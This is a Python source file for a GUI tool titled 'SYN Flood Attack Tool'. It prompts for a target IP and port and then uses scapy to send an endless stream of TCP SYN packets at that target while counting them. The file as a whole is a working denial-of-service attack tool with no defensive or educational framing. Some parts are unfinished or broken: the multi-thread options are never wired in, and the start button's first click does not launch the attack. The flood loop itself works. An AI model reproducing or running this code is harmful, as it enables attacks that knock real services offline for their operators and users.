import socket
from scapy.all import *
import os
import threading
import sys
import tkinter as tk
from tkinter.scrolledtext import ScrolledText
from tkinter import simpledialog

packet_count = 0

def attack(target_ip, target_port):
    global packet_count
    while start_button["text"] == "Stop Attack":
        packet = IP(dst=target_ip) / TCP(sport=RandShort(), dport=int(target_port), flags="S")
        send(packet, verbose=0)
        packet_count += 1
        if sys.stdout:
            sys.stdout.write(f"Packet {packet_count} sent!\n")
            sys.stdout.flush()

def toggle_attack():
    if start_button["text"] == "Start Attack":
        start_button["text"] = "Stop Attack"
        target_ip = simpledialog.askstring("Target IP", "Enter the target IP:")
        target_port = simpledialog.askstring("Target Port", "Enter the target port:")
        attack_thread = threading.Thread(target=attack, args=(target_ip, target_port))
        attack_thread.start()
    else:
        start_button["text"] = "Start Attack"

root = tk.Tk()
root.title("SYN Flood Attack Tool 6.3.1 - By JieJiaoDeMao_wjz")

output_text = ScrolledText(root, height=10, width=50)
output_text.pack()

start_button = tk.Button(root, text="Initalize Attack Script(Manually, Required at Startup)", command=toggle_attack)
start_button.pack()

multi_thread_var = tk.IntVar()
multi_thread_check = tk.Checkbutton(root, text="Enable Multi-thread", variable=multi_thread_var)
multi_thread_check.pack()

num_threads_label = tk.Label(root, text="Number of Threads:")
num_threads_label.pack()

num_threads_entry = tk.Entry(root)
num_threads_entry.pack()

speed_label = tk.Label(root, text="Attacking Speed: --- packets per second")
speed_label.pack()

def enumerate_packets():
    global packet_count
    output_text.insert(tk.END, f"Packets Sent: {packet_count}\n")
    output_text.see(tk.END)

enumerate_button = tk.Button(root, text="Count the Packets sent", command=enumerate_packets)
enumerate_button.pack()

root.mainloop()
